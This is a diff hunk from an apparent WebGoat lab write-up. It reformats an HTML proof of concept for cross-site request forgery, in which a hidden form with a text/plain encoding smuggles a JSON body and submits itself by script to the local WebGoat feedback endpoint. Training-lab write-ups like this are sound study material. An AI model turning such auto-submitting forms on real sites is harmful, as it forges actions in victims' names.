@@ -44,7 +44,9 @@ I stuck for a while here. We provided with a writeup on how to exploit some CSRF
   <head></head>
   <body>
     <form name="sample" action="http://localhost:8080/WebGoat/csrf/feedback/message" method="POST" ENCTYPE="text/plain">
-      <input type="hidden" name='{"name":"WebGoat","email":"webgoat@webgoat.org","subject":"service","content":"WebGoat is the best!!"}'/>
+      <input type="hidden" 
+             name='{"name":"WebGoat","email":"webgoat@webgoat.org","subject":"service","content":"WebGoat is the best!!"}'
+      />
     </form>
     <script>document.sample.submit();</script>
   </body>
